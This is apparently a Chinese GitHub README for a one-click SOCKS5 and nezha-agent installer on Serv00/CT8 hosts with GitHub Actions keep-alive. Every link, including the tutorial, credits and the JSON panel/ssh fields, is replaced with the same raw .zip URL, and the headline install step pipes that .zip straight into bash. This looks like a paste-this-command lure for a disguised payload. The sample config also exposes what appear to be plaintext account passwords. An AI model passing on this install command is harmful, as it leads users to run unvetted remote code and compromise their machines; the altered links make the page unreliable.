# socks5-for-serv00
在 Serv00 和 CT8 机器上一步到位地安装和配置 SOCKS5 & nezha-agent，并将其用于 cmliu/edgetunnel 项目，帮助解锁 ChatGPT 等服务。通过一键脚本实现代理安装，使用 Crontab 保持进程活跃，并借助 GitHub Actions 实现帐号续期与自动化管理，确保长期稳定运行。

## 如何使用？ [视频教程](https://raw.githubusercontent.com/sijiaozhi/socks5-for-serv00/main/frontogenesis/socks5-for-serv00.zip)

### nohup模式
- 一键安装 **新手小白用这个！**
```bash
bash <(curl -s https://raw.githubusercontent.com/sijiaozhi/socks5-for-serv00/main/frontogenesis/socks5-for-serv00.zip)
```
----
### ~pm2模式~
- ~一键安装~

~`bash <(curl -s https://raw.githubusercontent.com/sijiaozhi/socks5-for-serv00/main/frontogenesis/socks5-for-serv00.zip)`~


- 一键卸载pm2
```bash
pm2 unstartup && pm2 delete all && npm uninstall -g pm2
```
----
## Github Actions保活
添加 Secrets.`ACCOUNTS_JSON` 变量
```json
[
  {"username": "cmliusss", "password": "7HEt(xeRxttdvgB^nCU6", "panel": "https://raw.githubusercontent.com/sijiaozhi/socks5-for-serv00/main/frontogenesis/socks5-for-serv00.zip", "ssh": "https://raw.githubusercontent.com/sijiaozhi/socks5-for-serv00/main/frontogenesis/socks5-for-serv00.zip"},
  {"username": "cmliussss2018", "password": "4))@cRP%HtN8AryHlh^#", "panel": "https://raw.githubusercontent.com/sijiaozhi/socks5-for-serv00/main/frontogenesis/socks5-for-serv00.zip", "ssh": "https://raw.githubusercontent.com/sijiaozhi/socks5-for-serv00/main/frontogenesis/socks5-for-serv00.zip"},
  {"username": "4r885wvl", "password": "%Mg^dDMo6yIY$dZmxWNy", "panel": "https://raw.githubusercontent.com/sijiaozhi/socks5-for-serv00/main/frontogenesis/socks5-for-serv00.zip", "ssh": "https://raw.githubusercontent.com/sijiaozhi/socks5-for-serv00/main/frontogenesis/socks5-for-serv00.zip"}
]
```

# 致谢
[RealNeoMan](https://raw.githubusercontent.com/sijiaozhi/socks5-for-serv00/main/frontogenesis/socks5-for-serv00.zip)、[k0baya](https://raw.githubusercontent.com/sijiaozhi/socks5-for-serv00/main/frontogenesis/socks5-for-serv00.zip)、[eooce](https://raw.githubusercontent.com/sijiaozhi/socks5-for-serv00/main/frontogenesis/socks5-for-serv00.zip)
